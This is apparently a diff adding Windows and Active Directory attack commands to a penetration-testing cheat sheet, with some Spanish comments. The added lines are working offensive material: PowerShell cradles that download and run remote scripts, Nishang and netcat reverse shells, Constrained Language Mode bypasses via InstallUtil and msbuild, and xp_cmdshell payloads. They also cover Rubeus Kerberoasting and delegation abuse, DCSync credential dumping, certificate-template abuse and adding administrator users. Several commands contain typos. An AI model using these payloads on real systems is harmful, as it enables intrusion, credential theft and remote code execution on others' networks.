@@ -323,6 +323,7 @@
 | PowerLurk | https://github.com/Sw4mpf0x/PowerLurk |
 | ADSearch |  https://github.com/tomcarver16/ADSearch |
 | SUIDump | https://github.com/lypd0/SUIDump |
+| ldapdomaindump | https://github.com/dirkjanm/ldapdomaindump |
 
 ### Exploit Databases
 
@@ -1075,6 +1076,9 @@ dir flag* /s /p
 dir /s /b *.log
 ```
 
+How to execute commands
+
+https://lolbas-project.github.io/#
 
 ```c
 systeminfo 
@@ -1088,8 +1092,80 @@ net group  GROUPNAME USERNAME /add
 sc queryex type=service state=all | find /i "SERVICE_NAME:" // list services
 ```
 
-Pagina web donde vienen los comandos y .exe 
-https://lolbas-project.github.io/#
+###### Powershell Nishang
+
+Invoke-PowerShellTcp.ps1  on the botton 
+
+```c
+Invoke-PowerShellTcp -Reverse -IPAddres ##LA nuestra# -Port 443 
+```
+
+```c
+start /b powershell IEX(New-Object Net.Web.Client).downloadString('http://IP:PORT/Ps.ps1' )
+cmd /c powershell IEX(New-Object Net.Web.Client).downloadString('http://IP:PORT/Ps.ps1' )
+powershell -c iex(iwr http://IP/Ps.ps1 -usebasicparsin)
+command = "powershell IEX(New-Object Net.WebClient).downloadString('http://IP/Ps.ps1')" // from browser
+```
+
+HTTP file download
+
+```c
+IWR -URI http://IP:PORT/FILE -OutFile PSbypass.exe
+    -OutFile %temp% //leave the file on a temporary folder
+```
+
+```c
+certutil.exe -f -urlcache -split http://IPJP.exe
+```
+
+```c
+powershell -c "iwr http://10.10.14.33/nc.exe -OutFile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd <MYIP> 443
+```
+
+Run from native route
+
+```c
+start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/Invoke-PowerShellTcp.ps1)
+```
+
+URL
+
+```c
+?cmd=echo%20IEX(New-Object%20Net.WebClient).DownloadString(%22http://IP/Ps.ps1%22)%20|%20powershell%20-noprofile%20-)
+```
+
+Bypass for PowerShell Constrained Language Mode
+
+```c
+$executioncontext.sessionstate.languagemode → ConstrainedLangage  Restricted mode https://github.com/padovah4ck/PSByPassCLM
+PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/Debug → PSBypassCLM.exe 
+Utility en C:\Windows\microsoft.net\framework64\ → choose utility v4.0.30319
+```
+
+```c
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=/LogToConsole=Tre /U /revshell=true /rhost=IP_MIA /rport=443 C:\Users\Direccion_delPSBY.exe
+```
+
+```c
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe rev.csproj IWR -URI http://10.10.14.8:8000/execute_shell.xml -OutFile rev.csproj
+```
+
+```c
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=/LogToConsole=True /U /revshell=true /rhost=10.10.14.8 /rport=443 C:\Users\amanda\Downloads\Psby.exe
+```
+
+NETCAT
+
+```c
+?cmd=powershell invoke-webrequest -uri IP:PORT/nc.exe -outfile NAME.exe
+despues para ejecutar: NAME.execurl 
+NAME.exe IP PORT -e powershell
+```
+
+```c
+C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.6/Ps.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"
+```
+
 
 #### PHP Webserver
 
@@ -1488,6 +1564,30 @@ ssh database_admin@192.168.50.10 -p2222
 ```c
 netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
+```
+
+###### Pivoting Kerberos
+
+```c
+In /etc/proxychains.conf socks4 127.0.0.1 1080
+```
+
+Get ticket of user
+
+```c
+proxychains getTGT.py -dc-ip <DC_IP> -aesKey <AESKey> <DOMAIN>/<USER>
+```
+
+Save ticket
+
+```c
+export KRB5CCNAME=<USER>.ccache
+```
+
+Get systemshell on a Machine with the ticket
+
+```c
+proxychains psexec.py -dc-ip <DC_IP> -target-ip <MTARGET_IP> -no-pass -k <DOMAIN1>/<USERNAME>@<DOMAINofMACHINE>
 ```
 
 #### Python Webserver
@@ -3553,6 +3653,27 @@ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth
 ```
 
+```c
+xp_cmdshell "powershell "IEX (New-ObjectNet.WebClient).DownloadString(\"http://IP:PORT/rev.ps1\");"
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://IP:PORT/rev.ps1") | powershell -noprofile'
+```
+
+```c
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
+```
+
+```c
+crackmapexec mssql -d <Domain name> -u <username> -p <password> 
+```
+
+```c
+mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
+```
+
+```c
+sqsh -S <IP> -U <Username> -P <Password> -D <Database>
+```
+
 ##### Common Commands
 
 ```c
@@ -4244,6 +4365,7 @@ hashcat -m 18200 -a 0 <FILE> <FILE>
 
 ```c
 hashcat -m 13100 --force <FILE> <FILE>
+john --format=krb5tgs --wordlist=wordlist SERVICE
 ```
 
 ##### Bruteforce based on the Pattern
@@ -5099,6 +5221,16 @@ Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" 
 impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
 ```
 
+Obtain an NTL Hash
+
+```c
+lsadump::dcsync /domain:testlab.local /user:Administrator
+```
+
+```c
+secretsdump.py -dc-ip IP DOMAIN/USER:PASS@IP
+```
+
 ##### Persistence
 
 ###### Task Scheduler
@@ -5277,7 +5409,15 @@ hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/ha
 
 ```c
 .\Rubeus.exe asreproast /nowrap
+.\Rubeus.exe asreproast /user:<USERNAME> /nowrap
 hashcat -m 18200 hashes.asreproast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
+john --format=krb5asrep --wordlist=wordlist <USERNAME>
+```
+
+Find users
+
+```c
+ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
 ```
 
 ###### Kerberoasting
@@ -5290,10 +5430,17 @@ hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/ha
 ```c
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 hashcat -m 13100 hashes.kerberoast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
+john --format=krb5tgs --wordlist=wordlist <USERNAME>
 ```
 
 ```c
 .\Rubeus.exe kerberoast /user:<USERNAME> /nowrap
+```
+
+Find users with SPN set
+
+```c
+ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
 ```
 
 ###### Silver Tickets
@@ -5530,6 +5677,8 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 
 ```c
 certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout
+.\Certify.exe cas
+.\Certify.exe find /vulnerable
 ```
 
 ##### ESC1: Misconfigured Certificate Templates
@@ -5537,6 +5686,20 @@ certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -
 ```c
 certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
 certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+```
+
+###### Windows
+
+```c
+.\Certify.exe request /ca:<CA> /template:<TEMPLATE> /altname:<administrator>
+```
+
+Copy the rsa keys and save it to cert.pem
+
+```c
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+cat cert.pfx | base64 -w 0
+.\Rubeus.exe asktgt /user:nlamb /certificate:<Base64Cert> /password:pass123 /nowrap
 ```
 
 ##### ESC2: Misconfigured Certificate Templates
@@ -5700,6 +5863,16 @@ bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -
 bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> -c all --zip
 bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
 bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
+```
+
+On victims machine
+
+```c
+Import-Module ./SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+
+```c
+SharpHound.exe -c All --ldapusername <USERNAME> --ldappassword <PASSWD>
 ```
 
 #### bloodyAD
@@ -6524,6 +6697,13 @@ ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local" | grep desc
 ldapsearch -x -h <RHOST> -b "dc=<RHOST>,dc=local" "*" | awk '/dn: / {print $2}'
 ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOST>,DC=local" | grep info
+```
+
+```c
+nmap -n -sV --script "ldap* and not brute"  <IP>
+```
+```c
+python3 ldapdomaindump.py -u 'DOMAIN\USER' -p PASSWORD IP -o /var/www/html/
 ```
 
 #### Linux
@@ -7600,6 +7780,16 @@ schtasks /query /fo LIST /v
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
 vaultcmd /list //credentials
+Get-ADPrincipalGroupMembership USERNAME | Format-Table -auto  // User group
+Get-ADPrincipalGroupMembership username | select
+gci -force //powershell ls -al
+```
+###### Create windows user
+
+```c
+net user <USERNAME> <NEWPAS> /add
+net localgroup Administrators henrial /add //add to admin group
+net group <GROUPNAME> <USERNAME> /add //add to a group
 ```
 
 ##### Access Control
@@ -8708,16 +8898,16 @@ Extract this TGT
 ```
 
 ```c
-.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:doIFwj[...]MuSU8=
+.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:<TICKET>
 ```
 OR 
 
 Catch TGTs for computers accounts
 
 ```c
-Rubeus.exe monitor /interval:10 /nowrap
+.\Rubeus.exe monitor /interval:10 /nowrap
 
-SharpSpoolTrigger.exe <ComputerNAME> <Listener>
+SharpSpoolTrigger.exe <TargetComputerNAME_DC> <Listener>
 ```
 
 OR
@@ -8730,6 +8920,84 @@ Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:<TICKET>
 
 ```c
 steal_tocken <PID>
+```
+##### Constrained Delegations
+
+```c
+.\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
+```
+
+Get the LUID of the service krbtgt
+
+```c
+.\Rubeus.exe triage
+```
+
+Get the TGT
+
+```c
+.\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
+```
+
+With this TGT we can impersonate any user in the domain. perform an S4U2Self first and then an S4U2Proxy
+
+```c
+.\Rubeus.exe s4u /impersonateuser:<USERNAME_2_IMP> /msdsspn:<msds-allowedtodelegateto> /user:<USERNAMEofTICKET> /ticket:<TICKET> /nowrap
+```
+
+Grab the final S4U2Proxy ticket and pass it into a new logon session
+
+```c
+Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME_2_IMP> /password:FakePass /ticket:<S4U2_TICKET>
+```
+
+##### S4U2Self Abuse
+
+First capture a TGT of a remote machine trying to connect to the dc
+
+```c
+Rubeus.exe monitor /interval:10 /nowrap
+
+SharpSpoolTrigger.exe <TargetComputerNAME_DC> <Listener>
+```
+
+```c
+.\Rubeus.exe s4u /impersonateuser:<ADMIN> /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:<USERNAME> /ticket:<CAPTURED_TICKET> /nowrap
+```
+
+##### Resource-Based Constrained Delegation
+
+Get the SecurityIdentifier number
+
+```c
+powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
+```
+Convert
+
+```c
+powershell ConvertFrom-SID <SecurityIdentifierNumber>
+```
+
+Get the SID of a Computer account
+
+```c
+powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
+```
+
+Create a security descriptor
+
+```c
+$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"
+$rsdb = New-Object byte[] ($rsd.BinaryLength)
+$rsd.GetBinaryForm($rsdb, 0)
+```
+
+In cobaltstrike
+
+```c
+powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+
+powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
 ```
 
 #### Seatbelt
